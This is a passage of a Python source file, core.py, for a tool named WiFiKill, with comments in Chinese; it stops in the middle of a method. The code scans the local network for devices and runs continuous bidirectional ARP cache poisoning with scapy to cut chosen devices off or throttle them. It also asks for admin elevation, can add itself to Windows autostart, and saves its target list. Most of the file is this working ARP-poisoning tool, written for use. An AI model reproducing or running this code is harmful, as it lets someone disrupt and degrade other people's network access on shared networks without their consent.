#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
core.py — WiFiKill 逻辑层

职责：网络发现、ARP 阻断、白名单与状态持久化、环境自检。
约束：不向 stdout 输出任何内容（GUI 打包为 --windowed 时 stdout 为 None），
      所有消息通过 logger 回调派发。
"""

from __future__ import annotations

import json
import logging
import os
import re
import socket
import struct
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, asdict
from pathlib import Path

try:
    import winreg  # Windows 注册表；非 Windows 下置 None
except ImportError:
    winreg = None

WINDOWS = os.name == "nt"
BROADCAST = "ff:ff:ff:ff:ff:ff"
APP_NAME = "WiFiKill"
APP_VERSION = "2.7.3"

if getattr(sys, "frozen", False):
    APP_DIR = Path(sys.executable).resolve().parent
else:
    APP_DIR = Path(__file__).resolve().parent

STATE_FILE = APP_DIR / ".wifikill-state.json"
WHITELIST_FILE = APP_DIR / "whitelist.txt"
ALIAS_FILE = APP_DIR / "aliases.json"   # 设备备注：mac/ip → 名字
LOCK_PORT = 51999

_MAC_RE = re.compile(r"^([0-9a-f]{2}:){5}[0-9a-f]{2}$")
_IP_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")


# ------------------------------------------------------------------ 基础工具


def log_levels():
    return ("debug", "info", "ok", "warn", "err")


class Logger:
    """线程安全的回调式日志；无订阅者时静默。"""

    def __init__(self):
        self._sinks = []
        self._lock = threading.Lock()

    def subscribe(self, fn):
        with self._lock:
            self._sinks.append(fn)

    def emit(self, level: str, msg: str):
        with self._lock:
            sinks = list(self._sinks)
        for fn in sinks:
            try:
                fn(level, msg)
            except Exception:
                pass


LOG = Logger()


def resource_path(name: str) -> str:
    """取随包分发的资源文件路径。

    PyInstaller onefile 会把资源解到 sys._MEIPASS，源码运行时就在脚本旁边。
    """
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    path = os.path.join(base, name)
    return path if os.path.exists(path) else ""


def _run_hidden(cmd: list[str], encoding: str) -> str:
    """执行外部命令且不弹出控制台窗口（GUI 打包必需）。"""
    kwargs = {}
    if WINDOWS:
        kwargs["creationflags"] = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
    try:
        p = subprocess.run(cmd, capture_output=True, encoding=encoding,
                           errors="replace", timeout=10, **kwargs)
        return p.stdout or ""
    except Exception:
        return ""


# ------------------------------------------------------------------ 厂商库

BUILTIN_OUI = {
    "000C29": "VMware", "005056": "VMware", "000569": "VMware",
    "080027": "VirtualBox", "0A0027": "VirtualBox",
    "001C42": "Parallels", "525400": "QEMU/KVM", "00163E": "Xen",
    "00155D": "Microsoft Hyper-V",
    "B827EB": "Raspberry Pi", "DCA632": "Raspberry Pi", "E45F01": "Raspberry Pi",
    "240AC4": "Espressif", "30AEA4": "Espressif", "7C9EBD": "Espressif",
    "84F3EB": "Espressif", "AC67B2": "Espressif", "C44F33": "Espressif",
    "3C6105": "Espressif", "8CAAB5": "Espressif", "246F28": "Espressif",
    "001D0F": "TP-Link", "50C7BF": "TP-Link", "A42BB0": "TP-Link",
    "14CC20": "TP-Link", "C46E1F": "TP-Link",
    "001B63": "Apple", "0023DF": "Apple", "001EC2": "Apple",
    "3C0754": "Apple", "68A86D": "Apple", "8C8590": "Apple",
    "A483E7": "Apple", "F01898": "Apple", "D0817A": "Apple",
    "0012FB": "Samsung", "3423BA": "Samsung", "5C0A5B": "Samsung",
    "8C7712": "Samsung", "C0BDD1": "Samsung", "E8508B": "Samsung",
    "286C07": "Xiaomi", "64B473": "Xiaomi", "7811DC": "Xiaomi",
    "508F4C": "Xiaomi", "34CE00": "Xiaomi", "F8A45F": "Xiaomi",
    "00E0FC": "Huawei", "4846FB": "Huawei", "70723C": "Huawei",
    "8853D4": "Huawei", "ACE215": "Huawei", "D07AB5": "Huawei",
    "001B21": "Intel", "3C970E": "Intel", "8C1645": "Intel",
    "001E37": "Hewlett-Packard", "00248C": "ASUSTek",
}

VENDOR_TYPE = [
    (("apple", "xiaomi", "samsung", "huawei", "oppo", "vivo", "oneplus",
      "realme", "meizu", "honor"), "移动设备"),
    (("espressif", "raspberry"), "智能家居"),
    (("tp-link", "tenda", "netgear", "asus", "h3c", "ruijie"), "网络设备"),
    (("vmware", "virtualbox", "qemu", "xen", "parallels", "hyper-v"), "虚拟机"),
    (("intel", "realtek", "hewlett", "dell", "lenovo", "micro-star"), "电脑"),
]

_oui_cache: dict[str, str] | None = None
_oui_lock = threading.Lock()


def oui_table(extra_path: str | None = None) -> dict[str, str]:
    global _oui_cache
    with _oui_lock:
        if _oui_cache is None:
            _oui_cache = dict(BUILTIN_OUI)
            if extra_path:
                _merge_oui(_oui_cache, extra_path)
        return _oui_cache


def _merge_oui(table: dict, path: str):
    p = Path(path)
    if not p.exists():
        LOG.emit("warn", f"OUI 文件不存在：{p}")
        return
    n = 0
    for line in p.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "," in line:
            parts = [x.strip() for x in line.split(",")]
            if len(parts) >= 3 and re.fullmatch(r"[0-9A-Fa-f]{6}", parts[1]):
                table[parts[1].upper()] = parts[2]
                n += 1
        else:
            parts = line.split(None, 1)
            if len(parts) == 2:
                key = parts[0].replace(":", "").replace("-", "").upper()
                if re.fullmatch(r"[0-9A-F]{6}", key):
                    table[key] = parts[1]
                    n += 1
    LOG.emit("info", f"已加载自定义 OUI {n} 条")


def lookup_vendor(mac: str, table: dict[str, str]) -> str:
    prefix = mac.replace(":", "").upper()[:6]
    if not prefix or prefix in ("000000", "FFFFFF"):
        return "—"
    if prefix in table:
        return table[prefix]
    try:
        if int(prefix[1], 16) & 0x2:
            return "随机 MAC"
    except ValueError:
        pass
    return "—"


def guess_type(vendor: str) -> str:
    v = vendor.lower()
    if vendor == "随机 MAC":
        return "移动设备?"
    for keys, label in VENDOR_TYPE:
        if any(k in v for k in keys):
            return label
    return "—"


# ------------------------------------------------------------------ 环境


_scapy = None
_scapy_lock = threading.Lock()


def scapy_mod():
    global _scapy
    with _scapy_lock:
        if _scapy is None:
            logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
            logging.getLogger("scapy.loading").setLevel(logging.ERROR)
            try:
                import scapy.all as s
                _scapy = s
            except Exception as e:
                LOG.emit("err", f"scapy 加载失败：{e}")
                return None
        return _scapy


def scapy_version() -> str:
    try:
        import scapy
        return getattr(scapy, "VERSION", "?")
    except Exception:
        return "?"


def is_admin() -> bool:
    if not WINDOWS:
        try:
            return os.geteuid() == 0
        except Exception:
            return False
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def l2_check() -> tuple[str, str]:
    """返回 (阻断码, 说明)。

    只判定"确定无法工作"的条件：ok / no_scapy / no_npcap。
    不提管理员：Npcap 的驱动权限因安装选项而异，实测存在非管理员可发送的情况，
    以管理员为硬门槛会造成假阴性。真实权限不足会在 sendp 时以异常暴露。
    """
    s = scapy_mod()
    if s is None:
        return "no_scapy", "scapy 未加载"
    if WINDOWS:
        try:
            use_pcap = s.conf.use_pcap
        except Exception:
            use_pcap = False
        if not use_pcap:
            return "no_npcap", "未安装 Npcap（发送二层帧必需）"
    return "ok", "ok"


def _relaunch_command(extra_args: list[str] | None = None,
                      script: str | None = None) -> tuple[str, str]:
    """返回 (可执行文件, 参数串)。

    对抗性审查第 8 轮（探针复现）：源码运行时只传 extra_args，参数串是**空**的——
    UAC 提权后拉起的是一个没有任何脚本的 python.exe（黑框一闪就退），用户等于丢了程序。
    所以非 frozen 运行时必须把入口脚本路径插到参数最前面。
    """
    args = list(extra_args or [])
    if not getattr(sys, "frozen", False):
        entry = script or (sys.argv[0] if sys.argv and sys.argv[0].endswith(".py")
                           else "gui.py")
        args.insert(0, os.path.abspath(entry))
    return sys.executable, subprocess.list2cmdline(args)


def relaunch_elevated(extra_args: list[str] | None = None) -> bool:
    if not WINDOWS or is_admin():
        return False
    try:
        import ctypes
        target, params = _relaunch_command(extra_args)
        rc = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", target, params, None, 1)
        return rc > 32
    except Exception:
        return False


# ------------------------------------------------------------------ 开机自启

RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
AUTOSTART_NAME = "WiFiKill"


def autostart_enabled() -> bool:
    """是否已写入 Run 键（开机自动启动）。"""
    if not WINDOWS or winreg is None:
        return False
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY) as k:
            try:
                val, _ = winreg.QueryValueEx(k, AUTOSTART_NAME)
                return bool(val)
            except FileNotFoundError:
                return False
    except Exception:
        return False


def set_autostart(enable: bool) -> bool:
    """写/删 Run 键实现开机自动启动。HKCU 不需要管理员即可写入；
    真正以管理员身份运行由 exe 的 UAC 清单（uac_admin）保证。

    返回是否成功。失败（如权限不足）时由调用方提示用户。
    """
    if not WINDOWS or winreg is None:
        return False
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
                            winreg.KEY_SET_VALUE) as k:
            if enable:
                val = f'"{sys.executable}" --minimized'
                winreg.SetValueEx(k, AUTOSTART_NAME, 0, winreg.REG_SZ, val)
            else:
                try:
                    winreg.DeleteValue(k, AUTOSTART_NAME)
                except FileNotFoundError:
                    pass
        return True
    except Exception as e:
        LOG.emit("warn", f"设置开机自启失败：{e}")
        return False


# ------------------------------------------------------------------ 守护设置

GUARD_FILE = APP_DIR / "guard.json"


def guard_enabled() -> bool:
    """是否开启了「本机守护（主动防御）」。"""
    try:
        if GUARD_FILE.exists():
            return bool(json.loads(GUARD_FILE.read_text(encoding="utf-8")).get("enabled", False))
    except Exception:
        pass
    return False


def set_guard_enabled(enable: bool) -> bool:
    """持久化守护开关；返回是否成功（理论上不会失败，除非程序目录只读）。"""
    try:
        tmp = GUARD_FILE.with_suffix(".tmp")
        tmp.write_text(json.dumps({"enabled": bool(enable)}, ensure_ascii=False, indent=2),
                      encoding="utf-8")
        os.replace(tmp, GUARD_FILE)
        return True
    except Exception as e:
        LOG.emit("warn", f"保存守护设置失败：{e}")
        return False


# ------------------------------------------------------------------ 网络信息


@dataclass
class NetInfo:
    iface: str = ""
    my_ip: str = ""
    my_mac: str = ""
    gateway_ip: str = ""
    gateway_mac: str = ""
    cidr: str = ""
    iface_name: str = ""

    @property
    def ready(self) -> bool:
        return bool(self.my_ip and self.gateway_ip)


def friendly_iface(npif: str) -> str:
    """把 \\Device\\NPF_{GUID} 换成可读的网卡描述。"""
    s = scapy_mod()
    if s is not None and npif:
        try:
            for iface in s.conf.ifaces.values():
                if getattr(iface, "network_name", "") == npif:
                    desc = (getattr(iface, "description", "") or "").strip()
                    alias = (getattr(iface, "name", "") or "").strip()
                    if desc and alias:
                        return f"{alias} · {desc}"
                    return desc or alias or npif
        except Exception:
            pass
    return npif


def local_mac() -> str:
    if WINDOWS:
        out = _run_hidden(["getmac", "/fo", "csv", "/nh"], "gbk")
        for line in out.splitlines():
            m = re.search(r"([0-9A-F]{2}-){5}[0-9A-F]{2}", line, re.I)
            if m:
                return m.group(0).replace("-", ":").lower()
    return "00:00:00:00:00:00"


def cidr_range(cidr: str) -> tuple[int, int]:
    try:
        net_s, _, plen_s = cidr.partition("/")
        plen = int(plen_s or 24)
        mask = (0xFFFFFFFF << (32 - plen)) & 0xFFFFFFFF
        ip_int = struct.unpack("!I", socket.inet_aton(net_s))[0]
        return ip_int & mask, mask
    except Exception:
        return 0, 0


def same_subnet(ip: str, cidr: str) -> bool:
    net, mask = cidr_range(cidr)
    if mask == 0:
        return True
    try:
        return (struct.unpack("!I", socket.inet_aton(ip))[0] & mask) == net
    except Exception:
        return False


def get_netinfo(cidr: str | None = None) -> NetInfo:
    s = scapy_mod()
    ni = NetInfo()
    if s is not None:
        try:
            iface, my_ip, gw = s.conf.route.route("0.0.0.0")
            ni.iface, ni.my_ip, ni.gateway_ip = iface, my_ip, gw
            try:
                ni.my_mac = s.get_if_hwaddr(iface)
            except Exception:
                pass
        except Exception as e:
            LOG.emit("warn", f"路由探测失败：{e}")
    if not ni.my_mac or ni.my_mac == "00:00:00:00:00:00":
        ni.my_mac = local_mac()

    prefix, net_int = 24, None
    if s is not None and ni.my_ip:
        try:
            ip_int = struct.unpack("!I", socket.inet_aton(ni.my_ip))[0]
            best = None
            for net, mask, _g, _ifc, addr, _m in s.conf.route.routes:
                if addr != ni.my_ip or net == 0:
                    continue
                if bin(mask).count("1") >= 31:
                    continue
                if (ip_int & mask) == (net & mask):
                    if best is None or bin(mask).count("1") > bin(best).count("1"):
                        best = mask
            if best:
                prefix = bin(best).count("1")
                net_int = ip_int & best
        except Exception as e:
            LOG.emit("debug", f"网段探测异常：{e}")

    if ni.iface:
        ni.iface_name = friendly_iface(ni.iface)

    if cidr:
        ni.cidr = cidr
    elif net_int is not None:
        ni.cidr = f"{socket.inet_ntoa(struct.pack('!I', net_int))}/{prefix}"
    elif ni.my_ip:
        ni.cidr = f"{ni.my_ip}/24"
    return ni


def _arp_rows_to_table(rows) -> dict[str, str]:
    """把 (dwAddr, phys_bytes, dwType) 行转成 {ip: mac}（纯函数，便于无网卡单测）。"""
    table: dict[str, str] = {}
    for ip_int, phys, typ in rows:
        if typ == 2:                      # MIB_IPNET_TYPE_INVALID：已失效条目
            continue
        if len(phys) < 6:
            continue
        mac = ":".join(f"{b:02x}" for b in phys[:6])
        ip = socket.inet_ntoa(struct.pack("<L", ip_int))
        if mac == BROADCAST or mac.startswith("01:00:5e"):
            continue
        if ip.startswith(("224.", "239.", "255.")):
            continue
        table[ip] = mac
    return table


MAXLEN_PHYSADDR = 8


def _arp_table_winapi() -> dict[str, str] | None:
    """用 iphlpapi.GetIpNetTable 直接读 IPv4 邻居表，免起子进程。

    优化动机：本机守护每 2 秒核对一次网关映射，而 `arp -a` 每次都要启动一个进程
    （实测约 10–20 ms 的进程创建 + 解析开销，长期常驻累计明显）。
    这里换成一次 API 调用；任何失败（非 Windows / 结构解析异常 / API 不支持）
    都返回 None，由调用方回退到 `arp -a`，绝不因为优化而丢掉功能。
    """
    if not WINDOWS:
        return None
    try:
        import ctypes
        from ctypes import wintypes

        class MIB_IPNETROW(ctypes.Structure):
            _fields_ = [("dwIndex", wintypes.DWORD),
                        ("dwPhysAddrLen", wintypes.DWORD),
                        ("bPhysAddr", ctypes.c_ubyte * MAXLEN_PHYSADDR),
                        ("dwAddr", wintypes.DWORD),
                        ("dwType", wintypes.DWORD)]

        iphlpapi = ctypes.windll.iphlpapi
        size = wintypes.ULONG(0)
        # 第一次调用只为拿所需缓冲区大小（返回 ERROR_INSUFFICIENT_BUFFER=122）
        iphlpapi.GetIpNetTable(None, ctypes.byref(size), False)
        if not size.value:
            return {}
        buf = ctypes.create_string_buffer(size.value)
        if iphlpapi.GetIpNetTable(buf, ctypes.byref(size), False) != 0:
            return None
        n = ctypes.cast(buf, ctypes.POINTER(wintypes.DWORD)).contents.value
        base = ctypes.addressof(buf) + ctypes.sizeof(wintypes.DWORD)
        arr = (MIB_IPNETROW * int(n)).from_address(base)
        rows = [(int(r.dwAddr), bytes(r.bPhysAddr[:r.dwPhysAddrLen]), int(r.dwType))
                for r in arr]
        return _arp_rows_to_table(rows)
    except Exception as e:
        LOG.emit("debug", f"GetIpNetTable 不可用，回退 arp -a：{e}")
        return None


def arp_table() -> dict[str, str]:
    """读取系统 IPv4 邻居表：优先 WinAPI（免子进程），失败回退 `arp -a`。"""
    fast = _arp_table_winapi()
    if fast is not None:
        return fast
    if WINDOWS:
        out = _run_hidden(["arp", "-a"], "gbk")
    else:
        out = _run_hidden(["arp", "-an"], "utf-8")
    table: dict[str, str] = {}
    for line in out.splitlines():
        m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})\D+((?:[0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2})", line)
        if not m:
            continue
        ip, mac = m.group(1), m.group(2).replace("-", ":").lower()
        if mac == BROADCAST or mac.startswith("01:00:5e"):
            continue
        if ip.startswith(("224.", "239.", "255.")):
            continue
        table[ip] = mac
    return table


# ------------------------------------------------------------------ 设备


@dataclass
class Device:
    ip: str
    mac: str
    vendor: str = "—"
    dtype: str = "—"
    note: str = ""
    state: str = "未阻断"


def is_protected(d: Device) -> bool:
    """设备是否受保护（网关 / 本机）。受保护设备在任何路径下都不可被阻断。

    这是安全不变量：阻断网关会切断整个网络，阻断本机会让自己失联。
    单目标选择与「全阻断」都必须遵守，因此抽成纯函数并纳入测试。
    """
    return d.note in ("网关", "本机")


def scan(ni: NetInfo, timeout: float = 3.0, active: bool = True) -> tuple[list[Device], bool]:
    """返回 (设备列表, 是否包含主动扫描结果)

    主动扫描可能比系统 ARP 缓存少（休眠设备不回 ARP），因此两路结果合并，
    主动结果覆盖缓存结果，避免漏设备。
    """
    cached = {ip: mac for ip, mac in arp_table().items()
              if same_subnet(ip, ni.cidr)}
    active_found: dict[str, str] = {}
    if active:
        s = scapy_mod()
        code, _ = l2_check()
        if s is not None and code == "ok":
            try:
                pkt = s.Ether(dst=BROADCAST) / s.ARP(pdst=ni.cidr)
                ans, _ = s.srp(pkt, timeout=timeout, iface=ni.iface,
                               verbose=0, inter=0.01)
                for _, r in ans:
                    active_found[r.psrc] = r.hwsrc.lower()
            except Exception as e:
                LOG.emit("debug", f"主动扫描失败：{e}")

    found = dict(cached)
    found.update(active_found)
    used_active = bool(active_found)

    table = oui_table()
    devs = []
    for ip, mac in sorted(found.items(), key=lambda x: tuple(map(int, x[0].split(".")))):
        v = lookup_vendor(mac, table)
        d = Device(ip=ip, mac=mac, vendor=v, dtype=guess_type(v))
        if ip == ni.gateway_ip:
            d.note = "网关"
        elif ip == ni.my_ip:
            d.note = "本机"
        devs.append(d)
    return devs, used_active


def arp_query(ip: str, ni: NetInfo) -> str | None:
    s = scapy_mod()
    code, _ = l2_check()
    if s is None or code != "ok":
        return None
    try:
        ans, _ = s.srp(s.Ether(dst=BROADCAST) / s.ARP(pdst=ip),
                       timeout=2, iface=ni.iface, verbose=0)
        for _, r in ans:
            return r.hwsrc.lower()
    except Exception:
        pass
    return None


def resolve_mac(ip: str, ni: NetInfo) -> str | None:
    if ip == ni.my_ip:
        return ni.my_mac
    if ip == ni.gateway_ip and ni.gateway_mac:
        return ni.gateway_mac
    mac = arp_table().get(ip)
    if mac:
        return mac
    mac = arp_query(ip, ni)
    if mac:
        return mac
    # 回退：全段扫一次
    try:
        devs, _ = scan(ni, 2.0, active=True)
        for d in devs:
            if d.ip == ip:
                return d.mac
    except Exception:
        pass
    return None


# ------------------------------------------------------------------ 状态持久化


_state_lock = threading.Lock()


def load_state() -> dict:
    try:
        if STATE_FILE.exists():
            return json.loads(STATE_FILE.read_text(encoding="utf-8"))
    except Exception as e:
        LOG.emit("warn", f"状态文件损坏，已忽略：{e}")
    return {}


def write_state(data: dict | None):
    """原子写入；data 为 None 表示删除。"""
    with _state_lock:
        try:
            if not data or not data.get("targets"):
                if STATE_FILE.exists():
                    STATE_FILE.unlink()
                return
            tmp = STATE_FILE.with_suffix(".tmp")
            tmp.write_text(json.dumps(data, indent=2), encoding="utf-8")
            os.replace(tmp, STATE_FILE)
        except Exception as e:
            LOG.emit("warn", f"状态写入失败：{e}")


def clear_state():
    write_state(None)


def load_whitelist() -> set[str]:
    if not WHITELIST_FILE.exists():
        return set()
    out = set()
    for line in WHITELIST_FILE.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip().lower()
        if line and not line.startswith("#"):
            out.add(line)
    return out


def load_aliases() -> dict[str, str]:
    """读设备备注。键是 MAC 或 IP，值是用户起的名字。"""
    try:
        data = json.loads(ALIAS_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}
    out = {}
    for k, v in (data or {}).items():
        if isinstance(v, str) and v.strip():
            out[str(k).lower()] = v.strip()
    return out


def save_aliases(items: dict[str, str]) -> None:
    """原子写备注，避免崩溃留下半个 JSON。

    写失败（程序目录只读 / 被占用）不抛给 GUI：备注是锦上添花，
    不该让一次改名把 Tk 回调打崩。
    """
    try:
        tmp = ALIAS_FILE.with_suffix(".tmp")
        tmp.write_text(json.dumps(items, ensure_ascii=False, indent=2),
                       encoding="utf-8")
        os.replace(tmp, ALIAS_FILE)
    except Exception as e:
        LOG.emit("warn", f"设备备注写入失败：{e}")


def save_whitelist(items: set[str]):
    try:
        WHITELIST_FILE.write_text(
            "\n".join(sorted(items)) + ("\n" if items else ""), encoding="utf-8")
    except Exception as e:
        LOG.emit("warn", f"白名单写入失败：{e}")


# ------------------------------------------------------------------ 阻断器


@dataclass
class Target:
    ip: str
    mac: str
    note: str = ""
    duty: int = 100      # 在线占空比 %：100=全断（默认）；50=十拍中五断五通；最小 10

    def key(self) -> str:
        return self.ip


class BlockError(RuntimeError):
    pass


def state_targets(data: dict | None) -> list["Target"]:
    """把状态文件里的 targets 解析成 Target 列表，非法条目跳过并记录。

    对抗性审查第 5 轮：GUI 恢复流程此前直接 `it["ip"]`，遇到缺字段 / 手改过的
    / 半截写入的状态文件就抛 KeyError —— 而它跑在工作线程里，异常只进 traceback，
    用户什么都看不到，程序表现为「恢复提示点了没反应」。解析下沉到逻辑层后可单测。
    """
    out: list[Target] = []
    items = (data or {}).get("targets")
    if not isinstance(items, list):
        return out
    for it in items:
        if not isinstance(it, dict):
            LOG.emit("warn", f"状态文件里有一条记录不是对象，已跳过：{it!r}")
            continue
        ip = str(it.get("ip") or "").strip()
        mac = str(it.get("mac") or "").strip().lower()
        if not _IP_RE.match(ip) or not _MAC_RE.match(mac):
            LOG.emit("warn",
                     f"状态文件里有一条记录地址不合法，已跳过（ip={ip!r} mac={mac!r}）")
            continue
        try:
            duty = int(it.get("duty", 100))
        except (TypeError, ValueError):
            duty = 100
        out.append(Target(ip, mac, note=str(it.get("note") or ""),
                          duty=max(10, min(100, duty))))
    return out


class Killer:
    """ARP 双向投毒会话。所有失败都以 BlockError / 日志呈现，不静默。"""

    def __init__(self, ni: NetInfo, interval: float = 1.5, dry_run: bool = False):
        self.ni = ni
        self.interval = max(0.3, float(interval))
        self.dry_run = dry_run
        self._targets: dict[str, Target] = {}
        self._lock = threading.RLock()
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._started = False
        self._send_errors = 0
        # 会话代际 + 发送锁（对抗性审查第 7 轮）：
        # 停止/恢复时先 +1 代际，使「还没检查代际的在途发送」直接作废；
        # 而发送本身在 _send_lock 里排他，所以 stop() 里 +1 代际必须等当前 sendp 返回。
        # 两者合起来保证：恢复帧一定排在最后，不会出现「恢复完又被补一枪投毒」的残留阻断。
        self._gen = 0
        self._send_lock = threading.RLock()
        self._late_sends = 0   # 被代际作废的发送次数（供测试与日志观察）

    # --- 状态 ---

    def targets(self) -> list[Target]:
        with self._lock:
            return list(self._targets.values())

    def is_active(self) -> bool:
        return self._thread is not None and self._thread.is_alive() and not self._stop.is_set()

    # --- 报文 ---

    def _frames(self, t: Target, restore: bool):
        s = scapy_mod()
        if s is None:
            raise BlockError("scapy 不可用")
        gw_ip, gw_mac = self.ni.gateway_ip, self.ni.gateway_mac
        if not _MAC_RE.match(gw_mac or ""):
            raise BlockError(f"网关 MAC 无效（{gw_mac!r}），拒绝投毒")
        if not _MAC_RE.match(t.mac or ""):
            raise BlockError(f"目标 MAC 无效（{t.mac!r}）")
        src = gw_mac if restore else self.ni.my_mac
        src_t = t.mac if restore else self.ni.my_mac
        to_target = (s.Ether(dst=t.mac) /
                     s.ARP(op=2, hwsrc=src, psrc=gw_ip, hwdst=t.mac, pdst=t.ip))
        to_gw = (s.Ether(dst=gw_mac) /
                 s.ARP(op=2, hwsrc=src_t, psrc=t.ip, hwdst=gw_mac, pdst=gw_ip))
        return to_target, to_gw

    def _emit(self, t: Target, restore: bool = False, count: int = 1,
              gen: int | None = None):
        """发一帧（投毒或恢复）。

        gen 非空时表示「本批属于第 gen 代会话」：一旦代际被推进（stop/remove/换网），
        本批剩余发送全部作废——这正是关闭「恢复帧与在途投毒帧交叉」窗口的关键。
        """
        s = scapy_mod()
        frames = self._frames(t, restore)
        for f in frames:
            if gen is not None:
                with self._send_lock:
                    if gen != self._gen:
                        self._late_sends += 1
                        return
            if self.dry_run:
                LOG.emit("debug", f"[演练] 告知 {f[1].pdst} ← {f[1].psrc} 的 MAC 是 {f[1].hwsrc}")
                continue
            try:
                with self._send_lock:
                    if gen is not None and gen != self._gen:
                        self._late_sends += 1
                        return
                    s.sendp(f, iface=self.ni.iface, verbose=0, count=count)
            except Exception as e:
                self._send_errors += 1
                raise BlockError(f"发送失败：{e}") from e

    # --- 生命周期 ---

    def start(self):
        # 防并发（与 Guard.start 同源）：stop() 后旧投毒线程未退出前不重复启动，
        # 避免双线程并发 _loop 重复发包。
        old = self._thread
        if old is not None and old.is_alive() and self._stop.is_set():
            old.join(timeout=3)
            if old.is_alive():
                LOG.emit("warn", "投毒线程尚未退出，本次不重复启动")
                return
        with self._lock:
            if self.is_active():
                return
            self._stop.clear()
            self._thread = threading.Thread(target=self._loop, daemon=True,
                                            name="wifikill-poison")
            self._started = True
            self._thread.start()

    def _bump_gen(self) -> int:
        """推进会话代际：等当前 sendp 返回后，让在途批次的剩余发送全部作废。"""
        with self._send_lock:
            self._gen += 1
            return self._gen

    def _loop(self):
        cycles = 0
        while not self._stop.is_set():
            # 每轮重新取代际：本轮中途发生 stop/remove/换网，则本轮剩余目标不再发送，
            # 下一轮用新代际继续（不会误停其他目标的阻断）。
            gen = self._gen
            with self._lock:
                targets = list(self._targets.values())
            for t in targets:
                if self._stop.is_set():
                    break
                try:
                    poison = self._should_poison(t, cycles)
                    self._emit(t, restore=not poison, gen=gen)
                except BlockError as e:
                    LOG.emit("warn", f"{t.ip} {e}")
                except Exception as e:
                    LOG.emit("warn", f"{t.ip} 投毒异常：{e}")
            cycles += 1
            self._stop.wait(self.interval)

    _THROTTLE_CYCLE = 10   # 占空比轮转周期（拍）：duty 按比例映射到本周期内的阻断拍数

    def _should_poison(self, t: Target, cycle_idx: int) -> bool:
        """占空比决策：duty=100 恒阻断；duty=p 在 10 拍周期里阻断 round(p/10) 拍，
        其余拍发恢复帧让双方缓存回填（目标间歇可上网 = 体感限速）。"""
        duty = max(10, min(100, int(getattr(t, "duty", 100) or 100)))
        if duty >= 100:
            return True
        return (cycle_idx % self._THROTTLE_CYCLE) < round(
            duty * self._THROTTLE_CYCLE / 100)

    def set_duty(self, ip: str, duty: int) -> bool:
        """调整已阻断目标的占空比（100 = 取消限速回到全断）。"""
        duty = max(10, min(100, int(duty)))
        with self._lock:
            t = self._targets.get(ip)
            if not t:
                return False
            t.duty = duty
        self.persist()
        LOG.emit("ok" if duty < 100 else "info",
                 f"{ip} 占空比已设为 {duty}%"
                 + ("（取消限速，恢复全断）" if duty >= 100 else "（限速中）"))
        return True

    def duty_of(self, ip: str) -> int | None:
        with self._lock:
            t = self._targets.get(ip)
            return t.duty if t else None

    def _is_protected_target(self, t: Target) -> bool:
        """目标是否指向网关 / 本机（IP 或 MAC 命中其一即拒绝，与 is_protected 同源）。

        这是安全不变量的 API 层强制：GUI 已经过滤过一次，但这里必须再挡一道 ——
        任何直接调用 core 的代码路径（插件、脚本、未来的 UI）都不能绕过这道门。

        为什么 IP 与 MAC 要「独立」判定（对抗性审查第 4 轮由回归测试逼出）：
        - 用网关 IP 作目标：to_target 的 psrc=gw_ip，等于告诉全网「网关 IP → 攻击方 MAC」，全家断网。
        - 用网关 MAC 作目标（IP 随便）：帧的以太 dst 是网关 MAC、且 psrc=gw_ip，
          网关会收到一条「我自己(gw_ip) 在攻击方 MAC 上」的 ARP 应答，污染网关自身映射。
        - 本机同理。所以只要 IP 或 MAC 任一命中网关/本机，就必须拒绝。
        """
        ni = self.ni
        t_mac = (t.mac or "").lower()
        bad_ips = {ni.gateway_ip, ni.my_ip}
        bad_macs = {(ni.gateway_mac or "").lower(), (ni.my_mac or "").lower()}
        if t.ip in bad_ips:
            return True
        if t_mac and t_mac in bad_macs:
            return True
        return False

    def add(self, t: Target) -> None:
        if not self._started and not self.dry_run:
            code, _ = l2_check()
            if code != "ok":
                raise BlockError("二层不可用，无法阻断")
        # 安全不变量在 API 层强制：网关 / 本机在任何路径下都不可被阻断。
        if self._is_protected_target(t):
            raise BlockError("受保护设备（网关/本机）不可被阻断")
        self._frames(t, restore=False)   # 先验证报文可构造
        with self._lock:
            self._targets[t.key()] = t
        try:
            self._emit(t, count=3)       # 首发成功才算真的入队
        except Exception:
            # 对抗性审查第 5 轮：此前发送失败只抛异常却不回滚，目标留在队列里，
            # 投毒线程起来后照样打它 —— 用户看到「跳过」，设备其实被断。
            with self._lock:
                self._targets.pop(t.key(), None)
            self.persist()
            raise
        self.persist()

    def remove(self, ip: str) -> bool:
        with self._lock:
            t = self._targets.pop(ip, None)
        if t:
            try:
                self._bump_gen()          # 本目标的在途投毒批次立即作废
                self._emit(t, restore=True, count=5)
            except Exception as e:
                LOG.emit("warn", f"恢复 {ip} 失败：{e}")
                # 恢复失败要放回队列，避免"以为放行了其实还断着"
                with self._lock:
                    self._targets[ip] = t
                return False
        self.persist()
        return True

    def restore_all(self) -> int:
        """停止并恢复全部目标，返回成功条数。"""
        self.stop()
        with self._lock:
            items = list(self._targets.values())
            self._targets.clear()
        ok = 0
        for t in items:
            try:
                self._emit(t, restore=True, count=5)
                ok += 1
            except Exception as e:
                LOG.emit("warn", f"恢复 {t.ip} 失败：{e}")
                with self._lock:
                    self._targets[t.ip] = t
        if not self._targets:
            clear_state()
        else:
            self.persist()
        return ok

    def stop(self):
        self._stop.set()
        self._bump_gen()     # 先作废在途发送，再等线程退出（顺序由 _send_lock 保证）
        th = self._thread
        if th and th.is_alive():
            th.join(timeout=3)
            if th.is_alive():
